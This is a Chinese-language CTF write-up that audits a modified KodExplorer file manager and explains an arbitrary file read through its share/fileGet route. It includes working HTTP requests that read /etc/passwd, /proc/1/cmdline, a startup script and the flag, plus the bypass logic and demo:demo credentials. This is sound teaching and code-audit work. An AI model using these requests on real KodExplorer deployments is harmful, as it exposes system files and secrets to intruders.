# 【CISCN 2022 华东南】xxcloud 任意文件读取 —— 一个菜鸟的源码审计笔记

> 题目基于 KodExplorer 魔改，照着网上的 WP 三步走（登录 demo → 创建分享 → 改包读文件）确实能拿到 Flag，但刚做完时我完全不知道底层发生了什么
>
> 作为一个只懂基础反序列化和常见危险函数的菜鸟，刚打开这种项目级源码时整个人都是懵的，所以逼着自己从入口开始把整条链盘了一遍
>
> 这篇笔记记录了完整的打法、常见疑问，以及我一步步把整条攻击链推出来的思考过程

## 基本信息

- 题目名称：[CISCN 2022 华东南]xxcloud
- 题目链接：https://www.nssctf.cn/problem/2393
- **考点清单**：PHP 代码审计、KodExplorer 路由机制、PHP 文件包含与路径处理、任意文件读取、路径穿越过滤绕过、权限校验分析
- **工具清单**：Burp Suite、VS Code、cmd5（MD5 密码查询）

## 一、最佳实践（直接打通的复现流程）

如果你现在只想先把环境打通、拿到 Flag，按下面四步走就行，每一步都有它存在的理由，后面的原理部分会逐一拆解：

1. **登录低权限账号**：使用 `demo:demo` 登录系统
2. **创建默认分享**：在桌面界面右键 `desktop` 创建分享，**所有默认配置都不要改**，直接确认生成
3. **截取请求包**：打开 Burp Suite，在历史记录里找到刚刚创建分享触发的 `POST /index.php?userShare/set` 数据包，发送到 Repeater 备用
4. **改包读取任意文件**：把请求方法改成 `GET`，替换路径和参数即可直接读取服务器本地文件（回显里的 `content` 字段是 Base64 编码，记得解码查看）：

* **读取 `/etc/passwd`（验证漏洞存在）**

```http
GET /index.php?share/fileGet&path=%7BuserShare%7D:100/desktop&filename=/etc/passwd HTTP/1.1
Host: node4.anna.nssnode.cn:25640
X-Requested-With: XMLHttpRequest
Cookie: 这里保留你原来的完整Cookie
Connection: close

```

* **读取 `/proc/1/cmdline`（查看容器启动进程）**

```http
GET /index.php?share/fileGet&path=%7BuserShare%7D:100/desktop&filename=/proc/1/cmdline HTTP/1.1
Host: node4.anna.nssnode.cn:25640
X-Requested-With: XMLHttpRequest
Cookie: 这里保留你原来的完整Cookie
Connection: close

```

* **读取启动脚本 `/run.sh`（排查 Flag 路径或环境变量）**

```http
GET /index.php?share/fileGet&path=%7BuserShare%7D:100/desktop&filename=/run.sh HTTP/1.1
Host: node4.anna.nssnode.cn:25640
X-Requested-With: XMLHttpRequest
Cookie: 这里保留你原来的完整Cookie
Connection: close

```

* **读取最终 Flag**

```http
GET /index.php?share/fileGet&path=%7BuserShare%7D:100/desktop&filename=/nsssctfflag HTTP/1.1
Host: node4.anna.nssnode.cn:25640
X-Requested-With: XMLHttpRequest
Cookie: 这里保留你原来的完整Cookie
Connection: close

```

---

## 二、常见困惑 Q&A

刚开始看这个 Payload 时，有几个地方特别反直觉，先集中把这几个疑问扫清：

### Q1：`demo:demo` 这个账号密码是从哪翻出来的？

在源码的 `data/system/system_member.php` 文件里存着所有用户的账号信息，格式是 `用户名:MD5密码`

从里面直接提取出 `demo` 对应的哈希，扔进 [cmd5](https://www.cmd5.com) 解密就能拿到明文密码 `demo`

---

### Q2：`?share/fileGet` 后面连个等号都没有，这算什么传参？

这不是普通参数，而是 KodExplorer 自己定义的一套**路由写法**，用来指定当前请求要调用哪个控制器的哪个方法

跟进 `app/function/web.function.php` 里的 `parse_incoming()` 就能看明白：

```php
$return = array_merge($_GET,$_POST);
$remote = array_get_index($return,0);           // 取第一个参数的【键名】
$remote = explode('/',trim($remote[0],'/'));    // 按斜杠 / 切开

```

PHP 解析 URL 时，会把没有值的 `share/fileGet` 当成一个**键名**塞进 `$_GET` 数组，随后框架把第一个键名拿出来按 `/` 切开，就得到了数组 `['share', 'fileGet']`

接着在 `app/core/Application.class.php` 的 `run()` 方法里完成分发：

```php
public function run(){
    $URI = $GLOBALS['in']['URLremote'];
    if (!isset($URI[0]) || $URI[0] == '') $URI[0] = $this->defaultController;
    if (!isset($URI[1]) || $URI[1] == '') $URI[1] = $this->defaultAction;

    $st  = $URI[0];   // share    → 控制器名
    $act = $URI[1];   // fileGet  → 方法名
    define('ST',$st);
    define('ACT',$act);
    $this->autorun();
    $this->appRun(ST,ACT);
}

```

说白了，这套系统的路由规则就是“第一个参数的键名即路由”，土但非常直白

---

### Q3：配置里写的 `controller => 'user'` 是怎么对应到具体 PHP 文件的？

框架采用的是**约定式自动加载**，把控制器名直接拼接成固定路径

以 `config/config.php` 里的自动运行配置为例：

```php
$config['autorun'] = array(
    array('controller'=>'user','function'=>'loginCheck'),  // 登录检查
    array('controller'=>'user','function'=>'authCheck'),   // 权限检查
    array('controller'=>'user','function'=>'bindHook'),
);

```

程序遍历这个数组时会依次执行 `$this->appRun('user', 'loginCheck')`，而 `appRun($className, $function)` 的内部逻辑非常简单粗暴：

1. 自动拼接路径 `app/controller/user.class.php` 并 `include` 进来
2. 实例化类 `new user()`
3. 调用指定方法 `$instance->loginCheck()`

整个请求生命周期里，`appRun()` 其实被调用了两轮：

| 调用阶段 | 配置来源 | 核心作用 |
| --- | --- | --- |
| 第一轮：前置自动执行 | `$config['autorun']` | 在业务开始前统一跑登录检查、权限检查和钩子 |
| 第二轮：业务路由分发 | URL 解析出的 `ST`、`ACT` | 真正加载目标控制器并处理当前请求 |

---

### Q4：既然 `autorun` 每次都会查登录和权限，为什么没登录也能访问 `share` 控制器？

因为 `share` 控制器在白名单里，直接免检

打开 `app/controller/user.class.php`，构造函数第 28 行明确写了免检列表：

```php
$this->notCheckST = array('share','deauthCheckbug');

```

在 `loginCheck()` 和 `authCheck()` 的最开头都有这么一句判断：

```php
if(in_array(ST, $this->notCheckST)) return;   // ST 为 share 时直接跳过检查

```

这是开发者为了方便“游客直接打开别人分享的链接”特意留的口子，所以 `share` 控制器天生免登录、免鉴权

---

## 三、完整原理分析（我是怎么把整条链盘通的）

搞懂了路由和前置检查，接下来我们从入口出发，顺着代码执行流把漏洞原理完整串起来

### 1. 入口与整体执行流

所有请求都从根目录的 `index.php` 进入，核心只有四行：

```php
include ('config/config.php');
$app = new Application();
init_config();
$app->run();
```

结合前面 Q&A 的分析，当发来 `?share/fileGet` 请求时，整条调用链的骨架非常清晰：

```text
HTTP 请求 (?share/fileGet)
  │
  ▼
parse_incoming()  ── 解析出 ST = 'share', ACT = 'fileGet'
  │
  ▼
run()
  ├── autorun()   ── 跑 user::loginCheck / authCheck（share 在白名单，直接放行）
  │
  └── appRun('share', 'fileGet')
        ├── include app/controller/share.class.php
        ├── new share()        ── ★ 触发构造函数（真正的安检门）
        └── share::fileGet()   ── ★ 触发 file_get_contents（漏洞落脚点）

```

### 2. 漏洞落脚点：`fileGet()` 里的空前缀拼接

直接来看 `app/controller/share.class.php` 中的目标函数 `fileGet()`：

```php
if(isset($this->in['fileUrl'])){
    $filepath = $this->in['fileUrl'];
    if(!request_url_safe($filepath)){ ... }   // 强制 http/https/ftp 开头，只能读远程
}else{
    $displayName = _DIR_CLEAR($this->in['filename']);
    $filepath = $this->sharePath . iconv_system($displayName);
    if (!path_readable($filepath)){ ... }      // 只检查文件是否可读，不限制目录范围
    if (filesize($filepath) >= 20M){ ... }     // 只检查文件大小
}
$fileContents = file_get_contents($filepath);
...
'content' => base64_encode($fileContents)      // 回显做了 Base64 编码

```

目标很明确，就是要控制最终传进 `file_get_contents($filepath)` 的路径，这里有两条分支：

* **分支一（传 `fileUrl`）**：里面有 `request_url_safe()` 校验，强制要求以 `http://` 或 `https://` 开头，根本读不了本地文件，直接放弃
* **分支二（传 `filename`）**：参数先经过 `_DIR_CLEAR()` 清洗，这个函数只过滤 `\` 和 `../` 这种相对路径穿越，**对 `/etc/passwd` 这种根目录开头的绝对路径完全无效**，后面的 `iconv_system()` 只是编码转换，没有任何拦截作用

于是核心问题就变成了：**能不能让前缀 `$this->sharePath` 变成空的（`null`）？**

只要 `$this->sharePath` 是 `null`，拼接出来的 `$filepath` 就是 `null . '/etc/passwd'`，直接变成干净的绝对路径 `/etc/passwd`

### 3. 关键突破：新流程漏给 `sharePath` 赋值

全局搜索 `$this->sharePath`，发现整个项目里**只有 `initShareOld()` 方法**给它赋过值，但 `initShareOld()` 里的权限校验写得很死，根本绕不过去

顺着方法名往下翻，既然有 `initShareOld()`，那肯定有对应的 `initShare()`，果然找到了：

```php
private function initShare(){
    if(isset($this->in['user'])){
        $this->initShareOld();   // 传了 user 参数才走旧流程
        return;
    }
    $this->path = _DIR($this->in['path']);       // ★ 新流程
    $this->shareInfo = $GLOBALS['kodShareInfo'];
    // ★★★ 整个新流程里，压根没给 $this->sharePath 赋值！
}

```

这里就是整道题最致命的漏洞点：

**只要请求里不传 `user` 参数，代码就会走新流程，而新流程从头到尾都没给 `$this->sharePath` 赋值，导致它默认就是 `null`**

### 4. 我踩的坑：漏算了 `new share()` 的构造函数

推到这里时，我一度以为直接在 URL 里传 `?share/fileGet&filename=/etc/passwd` 就能出 Flag 了，结果直接报错被拦

回头看 `appRun()` 的源码才反应过来：在调用 `fileGet()` 方法之前，框架会先执行 `new share()`，而**实例化对象一定会先触发构造函数 `__construct()`**：

```php
function __construct(){
    parent::__construct();
    $auth = systemRole::getInfo(1);

    $arrNotCheck = array('commonJs');
    if(substr($this->in['fileUrl'],0,4) == 'http'){
        $arrNotCheck[] = 'fileGet';              // 条件 ①：传了 http 开头的 fileUrl，才把 fileGet 加入免检名单
    }
    if (!in_array(ACT,$arrNotCheck)){            // 条件 ②：不在免检名单里，就必须过安检
        $this->initShare();
        $this->checkShare();
        $this->assign('canDownload',...);
    }
    ...
}

```

这两段 `if` 把路堵得死死的，两种走法只能二选一：

| 走法选择 | 构造函数安检情况 | 最终结果 |
| --- | --- | --- |
| 传 `fileUrl=http://...` | 命中条件 ①，`fileGet` 加入免检名单，跳过 `initShare` 和 `checkShare` | 进到 `fileGet()` 后被 `request_url_safe()` 限制死，只能读远程 URL，读不了本地文件 |
| 不传 `fileUrl`（我们的选择） | 不命中条件 ①，触发条件 ②，必须老老实实走完 `initShare()` 和 `checkShare()` | 顺利进入本地文件读取分支，触发 `sharePath` 为 `null` 的任意文件读取 |

所以为了走到后面的漏洞点，我们必须老老实实满足 `initShare()` 和 `checkShare()` 的安检要求

### 5. `checkShare()` 三道关卡：顺着规则过就行

先看安检的下半场 `checkShare()`，它一共设了三道关卡：

```php
if(!$this->shareInfo){ $this->_error(...); }         // 关 1：分享记录必须存在
if (isset($shareInfo['timeTo']) && strlen($shareInfo['timeTo'])!=0) {
    if (time() > strtotime($shareInfo['timeTo'])) { $this->_error(...); }   // 关 2：分享不能过期
}
if ($shareInfo['sharePassword']=='') return;          // 关 3：没有密码直接放行

```

这就是为什么前面“最佳实践”里强调**创建分享时什么都不要改，保持默认即可**：

* **关 1（存在性）**：只要我们提前在后台创建了一个分享，数据库/文件里就有记录，直接通过
* **关 2（有效期）**：默认创建的分享没有设置过期时间，`timeTo` 为空，整个判断直接跳过
* **关 3（访问密码）**：默认创建的分享不设密码，`sharePassword` 为空字符串，直接 `return` 放行（如果手贱设了密码，这里还得额外传 `password` 参数，纯属给自己加戏）

### 6. `path` 参数的一生：`{userShare}:100/desktop`

安检的最后一块拼图，是搞定关 1 里的 `$this->shareInfo`

在 `initShare()` 里，`$this->shareInfo` 的值直接取自全局变量 `$GLOBALS['kodShareInfo']`，全局搜索这个变量是谁赋值的，发现**只有虚拟路径解析函数 `_DIR()` 的 `{userShare}` 分支会给它赋值**

当我们传入 `path={userShare}:100/desktop` 时，`_DIR()` 内部会按顺序执行以下动作：

1. **格式清洗**：依次经过 `_DIR_CLEAR` 和 `iconv_system`，纯 ASCII 字符原样通过
2. **识别前缀**：检测到字符串以 `{userShare}` 开头，进入 `KOD_USER_SHARE` 分享路径处理分支
3. **拆分用户 ID**：按 `/` 和 `:` 切分字符串，把 `100` 提取出来赋值给 `$GLOBALS['kodPathId'] = '100'`
4. **查询用户信息**：调用 `systemMember::getInfo('100')` 核对用户是否存在，在 `data/system/system_member.php` 里，`admin` 的 ID 是 `1`，**`demo` 的 ID 正好是 `100**`
5. **身份比对（解释了为什么要登录）**：代码会判断 `if (kodPathId != $_SESSION['kodUser']['userID'])`，如果两边不相等就会触发严格的权限校验把请求拦死，**而我们提前登录了 `demo` 账号，当前 Session 里的 `userID` 恰好就是 `100**`，两边相等，权限校验直接跳过
6. **读取分享记录（解释了为什么要先建分享）**：调用 `userShareGet('100', 'desktop')`，去 `data/User/demo/data/share.php` 里查找名为 `desktop` 的分享记录，因为我们第一步已经在桌面右键创建了 `desktop` 的默认分享，这里顺利查出数据并赋值给 `$GLOBALS['kodShareInfo']`

至此，`__construct()` 里的所有门禁全部亮绿灯通过，程序紧接着调用 `share::fileGet()`，`null . '/etc/passwd'` 拼接生效，任意文件读取完成

### 7. 总结对照：每一步操作与 Payload 参数的真实职责

把所有环节串联起来，开头的三步操作和最终 Payload 里的每一个参数都各司其职：

| 操作 / 参数 | 对应到代码里的真实作用 |
| --- | --- |
| 登录 `demo:demo` + 携带 `Cookie` | 让 `$_SESSION['kodUser']['userID']` 等于 `100`，在 `_DIR()` 里匹配 `kodPathId`，跳过权限校验 |
| 右键创建 `desktop` 默认分享 | 在 `data/User/demo/data/share.php` 写入有效记录，喂饱 `kodShareInfo` 以通过 `checkShare()` 三道关卡 |
| `?share/fileGet` | 利用框架键名路由机制，定位到 `share` 控制器的 `fileGet` 方法 |
| `&path=%7BuserShare%7D:100/desktop` | **通行证参数**：触发 `_DIR()` 的分享分支给 `kodShareInfo` 赋值，它本身不会参与最终的文件路径拼接 |
| `&filename=/etc/passwd` | **攻击载荷参数**：利用新流程 `sharePath` 为 `null` 的缺陷，以绝对路径直读本地文件 |

---

## 四、复盘与心得

刚开始看这套项目级源码时确实容易被一堆配置文件和路由绕晕，后来换了个思路：不盯着零散片段瞎猜，直接从入口 `index.php` 顺着请求主干线往下跟，无关业务只看函数名跳过，一路摸清 `index.php` -> `run()` -> `appRun()` -> `new share()` -> `fileGet()`，整条链就通透了

把这次审计提炼出的几个实战经验记在这里，方便以后翻看，也供刚入门 Web 审计的师傅参考：

1. **别漏掉构造函数 `__construct()`**：在 MVC 框架里，路由调用目标方法之前一定会先实例化控制器，看危险函数前，先查构造函数里有没有提前拦截参数或必须满足的前置状态
2. **分清“通行证参数”和“攻击参数”**：这道题里的 `path` 没进最终文件路径，它的唯一作用就是满足前置校验，审计时遇到看不懂的参数，先判断它是不是过门禁的“通行证”
3. **只过滤 `../` 拦不住绝对路径**：只要前面拼接的目录前缀存在为空的可能，直接传 `/` 开头的绝对路径就能绕过目录限制
4. **变量漏赋值也是高危漏洞**：漏洞不一定是复杂的反序列化或注入，有时仅仅是重构新流程时漏写了一行变量初始化，就能直接打穿路径隔离
5. **善用工具还原混淆代码**：遇到 `_DIR_CLEAR` 这种做过混淆的底层函数，别硬着头皮人肉死磕，直接丢给 AI 转成可读伪代码理清逻辑，效率高得多